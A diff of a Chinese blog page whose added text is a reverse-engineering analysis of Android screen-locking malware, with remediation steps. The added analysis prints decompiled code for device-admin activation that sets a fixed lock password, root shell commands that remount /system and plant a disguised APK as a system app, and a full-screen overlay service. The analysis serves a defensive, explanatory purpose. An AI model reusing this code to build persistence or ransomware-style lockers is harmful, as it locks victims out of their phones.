@@ -12,10 +12,7 @@
 这个逆向分析呢，是半年前的，现在有博客了我就觉得把技术细节分享出来。当时的安卓锁机恶意程序有些泛滥，当时也正好得到一个样本就逆向分析了一下。
 
 正文
-锁机恶意程序一共分为两种：1、通过设备管理器锁机加密码2、设置一个view至最前缀。
-
-第一种
-在上一篇博文中的安全卫士中有用到这个设备管理器。原理和我项目中的是一样的。先自动跳转到激活设备管理器页面，用户点击激活后设置密码，安全卫士项目中有代">
+锁机恶意程序一共分为两种：1、通过设备管理器锁机加密码">
 <meta property="og:type" content="article">
 <meta property="og:title" content="对安卓锁机恶意程序反编译分析">
 <meta property="og:url" content="http://y00z.github.io/2017/01/08/对安卓锁机恶意程序反编译分析/index.html">
@@ -24,23 +21,17 @@
 这个逆向分析呢，是半年前的，现在有博客了我就觉得把技术细节分享出来。当时的安卓锁机恶意程序有些泛滥，当时也正好得到一个样本就逆向分析了一下。
 
 正文
-锁机恶意程序一共分为两种：1、通过设备管理器锁机加密码2、设置一个view至最前缀。
-
-第一种
-在上一篇博文中的安全卫士中有用到这个设备管理器。原理和我项目中的是一样的。先自动跳转到激活设备管理器页面，用户点击激活后设置密码，安全卫士项目中有代">
+锁机恶意程序一共分为两种：1、通过设备管理器锁机加密码">
 <meta property="og:image" content="http://y00z.github.io/images/1.8/01.png">
 <meta property="og:image" content="http://y00z.github.io/images/1.8/02.png">
-<meta property="og:updated_time" content="2017-01-06T16:29:35.811Z">
+<meta property="og:updated_time" content="2017-01-23T03:37:31.594Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="对安卓锁机恶意程序反编译分析">
 <meta name="twitter:description" content="前言
 这个逆向分析呢，是半年前的，现在有博客了我就觉得把技术细节分享出来。当时的安卓锁机恶意程序有些泛滥，当时也正好得到一个样本就逆向分析了一下。
 
 正文
-锁机恶意程序一共分为两种：1、通过设备管理器锁机加密码2、设置一个view至最前缀。
-
-第一种
-在上一篇博文中的安全卫士中有用到这个设备管理器。原理和我项目中的是一样的。先自动跳转到激活设备管理器页面，用户点击激活后设置密码，安全卫士项目中有代">
+锁机恶意程序一共分为两种：1、通过设备管理器锁机加密码">
 <meta name="twitter:image" content="http://y00z.github.io/images/1.8/01.png">
   
     <link rel="alternative" href="/atom.xml" title="Yooz的博客" type="application/atom+xml">
@@ -83,10 +74,6 @@
     		
     			
     			<a q-on="click: openSlider(e, 'innerArchive')" href="javascript:void(0)">所有文章</a>
-    			
-            
-    			
-    			<a q-on="click: openSlider(e, 'friends')" href="javascript:void(0)">友链</a>
     			
             
     			
@@ -185,7 +172,7 @@
 <p>这个逆向分析呢，是半年前的，现在有博客了我就觉得把技术细节分享出来。<br>当时的安卓锁机恶意程序有些泛滥，当时也正好得到一个样本就逆向分析了一下。</p>
 </blockquote>
 <h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><blockquote>
-<p>锁机恶意程序一共分为两种：<br>1、通过设备管理器锁机加密码<br>2、设置一个view至最前缀。</p>
+<p>锁机恶意程序一共分为两种：<br>1、通过设备管理器锁机加密码<a id="more"></a><br>2、设置一个view至栈顶端。</p>
 </blockquote>
 <h3 id="第一种"><a href="#第一种" class="headerlink" title="第一种"></a>第一种</h3><blockquote>
 <p>在上一篇博文中的安全卫士中有用到这个设备管理器。<br>原理和我项目中的是一样的。先自动跳转到激活设备管理器页面，用户点击激活后设置密码，安全卫士项目中有代码，这里就不多说了。</p>
@@ -197,6 +184,31 @@
 <p>把ijm-x86.so文件复制到了sd卡中，并且命名为zihao.l<br>再来看看ButtonClickListener的点击事件。<br><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">  <span class="keyword">private</span> <span class="keyword">final</span> <span class="class"><span class="keyword">class</span> <span class="title">ButtonClickListener</span></span></div><div class="line">  <span class="keyword">implements</span> <span class="title">View</span>.<span class="title">OnClickListener</span></div><div class="line">&#123;</div><div class="line">  <span class="function"><span class="keyword">public</span> <span class="title">ButtonClickListener</span><span class="params">()</span></span></div><div class="line">  &#123;</div><div class="line">  &#125;</div><div class="line"></div><div class="line">  <span class="meta">@Override</span></div><div class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(View paramView)</span></span></div><div class="line">  &#123;</div><div class="line">    b localb = <span class="keyword">new</span> b();</div><div class="line">    localb.rootShell();</div><div class="line">    a.deleteFile(c.<span class="keyword">this</span>.file);</div><div class="line">  &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
 <p>执行了b对象中的rootShell方法。我们继续跟进。<br><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">rootShell</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line">  execCommand(<span class="keyword">new</span> String[] &#123; <span class="string">"mount -o rw,remount /system"</span>, <span class="string">"mount -o rw,remount /system/app"</span>, <span class="string">"cp /sdcard/zihao.l /system/app/"</span>, <span class="string">"chmod 777 /system/app/zihao.l"</span>, <span class="string">"mv /system/app/zihao.l /system/app/zihao.apk"</span>, <span class="string">"chmod 644 /system/app/zihao.apk"</span>, <span class="string">"reboot"</span> &#125;, <span class="keyword">true</span>);</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
 <p>很明显，这个是执行shell命令的代码。<br>先把/system 和 /system/app 设置可读可写。<br>再从sd卡把zihao.l复制到/system/app中，并且命名zihao.apk。<br>最后再重启。<br>/system/app是存放系统app的，这个操作呢，是把zihao.apk设置成系统app，并且不可卸载。<br>这个zihao.apk也就是上面的ijm-x86.so，这个so文件其实一个apk程序，我们再来逆向分析一下这个ijm-x86.so。</p>
+</blockquote>
+<p>###分析第二层</p>
+<blockquote>
+<p>同样的手法，找到app的入口Activity.</p>
+</blockquote>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="meta">@Override</span></div><div class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">(Bundle paramBundle)</span></span></div><div class="line">&#123;</div><div class="line">  LogCatBroadcaster.start(<span class="keyword">this</span>);</div><div class="line">  <span class="keyword">super</span>.onCreate(paramBundle);</div><div class="line">  activiteDevice();</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<p>继续跟进</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">activiteDevice</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line">  Intent localIntent = <span class="keyword">new</span> Intent(<span class="string">"android.app.action.ADD_DEVICE_ADMIN"</span>);</div><div class="line">  NoClassDefFoundError localNoClassDefFoundError;</div><div class="line">  <span class="keyword">try</span></div><div class="line">  &#123;</div><div class="line">    Class localClass = Class.forName(<span class="string">"com.h.MyAdmin"</span>);</div><div class="line">    ComponentName localComponentName = <span class="keyword">new</span> ComponentName(<span class="keyword">this</span>, localClass);</div><div class="line">    localIntent.putExtra(<span class="string">"android.app.extra.DEVICE_ADMIN"</span>, localComponentName);</div><div class="line">    startActivityForResult(localIntent, <span class="number">0</span>);</div><div class="line">    <span class="keyword">return</span>;</div><div class="line">  &#125;</div><div class="line">  <span class="keyword">catch</span> (ClassNotFoundException localClassNotFoundException)</div><div class="line">  &#123;</div><div class="line">    localNoClassDefFoundError = <span class="keyword">new</span> NoClassDefFoundError(localClassNotFoundException.getMessage());</div><div class="line">  &#125;</div><div class="line">  <span class="keyword">throw</span> localNoClassDefFoundError;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<blockquote>
+<p>操作打开激活设备管理器的界面</p>
+<p>来看看MyAdmin里面的代码。</p>
+</blockquote>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line"><span class="meta">@Override</span></div><div class="line"> <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onEnabled</span><span class="params">(Context paramContext, Intent paramIntent)</span></span></div><div class="line"> &#123;</div><div class="line">   String str = Integer.toString(<span class="number">1997</span>);</div><div class="line">   NoClassDefFoundError localNoClassDefFoundError;</div><div class="line">   <span class="keyword">try</span></div><div class="line">   &#123;</div><div class="line">     Class localClass = Class.forName(<span class="string">"com.h.s"</span>);</div><div class="line">     Intent localIntent = <span class="keyword">new</span> Intent(paramContext, localClass);</div><div class="line">     localIntent.setFlags(<span class="number">268435456</span>);</div><div class="line">     paramContext.startService(localIntent);</div><div class="line">     getManager(paramContext).resetPassword(str, <span class="number">0</span>);</div><div class="line">     <span class="keyword">super</span>.onEnabled(paramContext, paramIntent);</div><div class="line">     <span class="keyword">return</span>;</div><div class="line">   &#125;</div><div class="line">   <span class="keyword">catch</span> (ClassNotFoundException localClassNotFoundException)</div><div class="line">   &#123;</div><div class="line">     localNoClassDefFoundError = <span class="keyword">new</span> NoClassDefFoundError(localClassNotFoundException.getMessage());</div><div class="line">   &#125;</div><div class="line">   <span class="keyword">throw</span> localNoClassDefFoundError;</div><div class="line"> &#125;</div></pre></td></tr></table></figure>
+<blockquote>
+<p>用户只要一点击激活，那么就会设置一个密码为1997的锁屏密码，并且开启s这个服务。<br>跟进看看这个服务做了些什么。<br>s里面杂乱代码太多，我们直接来看主要的。<br><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">c</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line">  WindowManager.LayoutParams localLayoutParams = <span class="keyword">new</span> WindowManager.LayoutParams();</div><div class="line">  <span class="keyword">this</span>.wmParams = localLayoutParams;</div><div class="line">  Application localApplication = getApplication();</div><div class="line">  getApplication();</div><div class="line">  <span class="keyword">this</span>.mWindowManager = ((WindowManager)localApplication.getSystemService(Context.WINDOW_SERVICE));</div><div class="line">  <span class="keyword">this</span>.wmParams.type = <span class="number">2010</span>;</div><div class="line">  <span class="keyword">this</span>.wmParams.format = <span class="number">1</span>;</div><div class="line">  <span class="keyword">this</span>.wmParams.flags = <span class="number">1280</span>;</div><div class="line">  <span class="keyword">this</span>.wmParams.gravity = <span class="number">49</span>;</div><div class="line">  <span class="keyword">this</span>.wmParams.x = <span class="number">0</span>;</div><div class="line">  <span class="keyword">this</span>.wmParams.y = <span class="number">0</span>;</div><div class="line">  <span class="keyword">this</span>.wmParams.width = -<span class="number">1</span>;</div><div class="line">  <span class="keyword">this</span>.wmParams.height = -<span class="number">1</span>;</div><div class="line">  <span class="keyword">this</span>.mFloatLayout = LayoutInflater.from(getApplication()).inflate(<span class="number">2130903041</span>, (ViewGroup)<span class="keyword">null</span>);</div><div class="line">  MediaPlayer localMediaPlayer = MediaPlayer.create(<span class="keyword">this</span>, <span class="number">2131099648</span>);</div><div class="line">  localMediaPlayer.setLooping(<span class="keyword">true</span>);</div><div class="line">  localMediaPlayer.start();</div><div class="line">  <span class="keyword">this</span>.mWindowManager.addView(<span class="keyword">this</span>.mFloatLayout, <span class="keyword">this</span>.wmParams);</div><div class="line">  <span class="keyword">this</span>.bt = ((Button)<span class="keyword">this</span>.mFloatLayout.findViewById(<span class="number">2131361794</span>));</div><div class="line">  <span class="keyword">this</span>.ed = ((EditText)<span class="keyword">this</span>.mFloatLayout.findViewById(<span class="number">2131361792</span>));</div><div class="line">  <span class="keyword">this</span>.tv = ((TextView)<span class="keyword">this</span>.mFloatLayout.findViewById(<span class="number">2131361793</span>));</div><div class="line">  <span class="keyword">try</span></div><div class="line">  &#123;</div><div class="line">    <span class="keyword">this</span>.ed.setHint(<span class="string">"宝贝在这输入密码！"</span>);</div><div class="line">    <span class="keyword">this</span>.tv.append(<span class="string">"恭喜中奖"</span>);</div><div class="line">    Button localButton = <span class="keyword">this</span>.bt;</div><div class="line">    <span class="number">100000001</span> local100000001 = <span class="keyword">new</span> View.OnClickListener()</div><div class="line">    &#123;</div><div class="line">      <span class="meta">@Override</span></div><div class="line">      <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(View paramView)</span></span></div><div class="line">      &#123;</div><div class="line">        <span class="keyword">try</span></div><div class="line">        &#123;</div><div class="line">          <span class="keyword">if</span> (s.<span class="keyword">this</span>.ed.getText().toString().equals(s.<span class="keyword">this</span>.des.decrypt(s.<span class="keyword">this</span>.share.getString(<span class="string">"passw"</span>, <span class="string">""</span>))))</div><div class="line">          &#123;</div><div class="line">            s.access$L1000001(s.<span class="keyword">this</span>).removeView(s.access$L1000002(s.<span class="keyword">this</span>));</div><div class="line">            s.<span class="keyword">this</span>.stopSelf();</div><div class="line">          &#125;</div><div class="line">          <span class="keyword">return</span>;</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">catch</span> (Exception localException)</div><div class="line">        &#123;</div><div class="line">        &#125;</div><div class="line">      &#125;</div><div class="line">    &#125;;</div><div class="line">    localButton.setOnClickListener(local100000001);</div><div class="line">  &#125;</div><div class="line">  <span class="keyword">catch</span> (Exception localException1)</div><div class="line">  &#123;</div><div class="line">    <span class="keyword">try</span></div><div class="line">    &#123;</div><div class="line">      TextView localTextView = <span class="keyword">this</span>.tv;</div><div class="line">      StringBuffer localStringBuffer1 = <span class="keyword">new</span> StringBuffer();</div><div class="line">      StringBuffer localStringBuffer2 = <span class="keyword">new</span> StringBuffer();</div><div class="line">      localTextView.append(localStringBuffer2.append(<span class="string">"\n"</span>).append(<span class="keyword">this</span>.des.decrypt(<span class="string">"e60b6ba97b41a1c7a31f1228d55280a8243703be7d4aa15c"</span>)).toString() + <span class="keyword">this</span>.share.getLong(<span class="string">"m"</span>, <span class="number">0</span>));</div><div class="line">      <span class="keyword">return</span>;</div><div class="line">      localException1 = localException1;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">catch</span> (Exception localException2)</div><div class="line">    &#123;</div><div class="line">    &#125;</div><div class="line">  &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
+<p>把一个布局文件全屏显示在屏幕中，以及设置组件的文字，大小，DES加密等。<br>重点：布局文件的type和flags属性。<br>可以让这个View一直显示在栈的顶端，任何其他view都会在这个view的下面，导致锁屏的假象。</p>
+</blockquote>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><blockquote>
+<p>这个锁机程序的运行流传，打开，把so文件改成apk文件防盗/system/app目录，重启，apk自启动，设置view到栈的顶端。<br>由于已经是系统应用了，所以双清也清除不了</p>
+</blockquote>
+<h2 id="解决办法。"><a href="#解决办法。" class="headerlink" title="解决办法。"></a>解决办法。</h2><blockquote>
+<p>手机必须是开启usb调试，连接电脑adb shell进入手机base shell，<br>进入/system/app目录，源码中的命令有说把该目录弄成可读可写，我们就借用那个命令，然后再把恶意app删掉即可rm -fr xx.apk，最后reboot重启。</p>
+</blockquote>
+<h2 id="末尾"><a href="#末尾" class="headerlink" title="末尾"></a>末尾</h2><blockquote>
+<p>为了不让恶意程序流传，我就不分享源程序了。<br>不过我写了一个锁屏的demo，仅仅打开后仅仅锁屏1分钟然后退出，并无其他恶意操作。<br>链接：<a href="https://share.weiyun.com/53c25ac04fcc5fd02b683458cddffff1" target="_blank" rel="external">https://share.weiyun.com/53c25ac04fcc5fd02b683458cddffff1</a> （密码：OTdFKW）</p>
 </blockquote>
 
       
@@ -453,25 +465,17 @@
       
       
     
-      
-      
-      
-    
     
 
     <ul style="width: 70%">
     
     
       
-      <li style="width: 33.333333333333336%" q-on="click: openSlider(e, 'innerArchive')"><a href="javascript:void(0)" q-class="active:innerArchive">所有文章</a></li>
+      <li style="width: 50%" q-on="click: openSlider(e, 'innerArchive')"><a href="javascript:void(0)" q-class="active:innerArchive">所有文章</a></li>
       
         
       
-      <li style="width: 33.333333333333336%" q-on="click: openSlider(e, 'friends')"><a href="javascript:void(0)" q-class="active:friends">友链</a></li>
-      
-        
-      
-      <li style="width: 33.333333333333336%" q-on="click: openSlider(e, 'aboutme')"><a href="javascript:void(0)" q-class="active:aboutme">关于我</a></li>
+      <li style="width: 50%" q-on="click: openSlider(e, 'aboutme')"><a href="javascript:void(0)" q-class="active:aboutme">关于我</a></li>
       
         
     </ul>
@@ -492,15 +496,15 @@
           <ul class="article-tag-list" q-show="showTags">
              
               <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="color5">hexo</a>
+              </li>
+             
+              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="color3">安卓</a>
               </li>
              
               <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="color5">安全攻防</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="color5">hexo</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -558,22 +562,6 @@
     	</section>
     
 
-    
-    	<section class="tools-section tools-section-friends" q-show="friends">
-  		
-        <ul class="search-ul">
-          
-            <li class="search-li">
-              <a href="https://www.baidu.com" target="_blank" class="search-title"><i class="icon-quo-left icon"></i>百度</a>
-            </li>
-          
-            <li class="search-li">
-              <a href="https://www.google.com" target="_blank" class="search-title"><i class="icon-quo-left icon"></i>谷歌</a>
-            </li>
-          
-        </ul>
-  		
-    	</section>
     
 
     
